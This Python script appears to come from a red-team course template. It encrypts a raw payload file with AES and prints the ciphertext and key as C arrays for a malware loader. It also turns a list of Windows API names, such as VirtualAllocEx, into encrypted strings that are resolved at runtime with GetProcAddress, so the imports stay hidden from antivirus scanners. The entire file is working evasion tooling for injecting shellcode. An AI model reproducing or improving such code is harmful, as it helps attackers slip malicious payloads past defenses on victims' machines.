# Red Team Operator course code template
# payload encryption with AES
# 
# Original author: reenz0h (twitter: @sektor7net)
#
# Heavily modified by: p4yl0ad
#
# Check out sektor7

import sys, re
from Crypto.Cipher import AES
from os import urandom
import hashlib



def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()


KEY = urandom(16)
ciphertext = aesenc(plaintext, KEY)
print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

def getcap(word):
    r = re.findall("([A-Z])", word)
    return ("".join (x for x in r) + word[len(word)-1])

def keyloops():
    with open("kekapi.txt", 'r+') as kapi:
        for i, e in enumerate(kapi):            
            LOOPKEY = urandom(16)
            #get first 3 characters + all capitals
            prepend = (e.rstrip("\n")[0:3] + getcap(e.rstrip("\n")))
            print("unsigned char " + "k" + prepend + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in LOOPKEY) + ' };')
            print("unsigned char " + "s" + prepend + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in e.rstrip("\n")) + ' };')
            #unsigned char kVAEx[] = { 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36 };
            #unsigned char sVAEx[] = { 0x3c, 0xb5, 0x6f, 0xac, 0x69, 0xb3, 0x6d, 0x18, 0x59, 0x7f, 0xcc, 0xc1, 0x4e, 0x8c, 0x39, 0xd6 };
            print("AESDecrypt((char *) "+"s" + prepend+", sizeof("+"s" + prepend+"), "+"k" + prepend+", sizeof("+"k" + prepend+"));")
            #AESDecrypt((char *) sVAEx, sizeof(sVAEx), kVAEx, sizeof(kVAEx));
            print("p" + prepend + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\")," + "s" + prepend + ");")
            #pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVAEx);




#KEY2 = "1234567890123456"
#ciphertext2 = aesenc("VirtualAllocEx\x00", KEY2)
#print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY2) + ' };')
#print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext2) + ' };')


if __name__ == "__main__":
    keyloops()
  
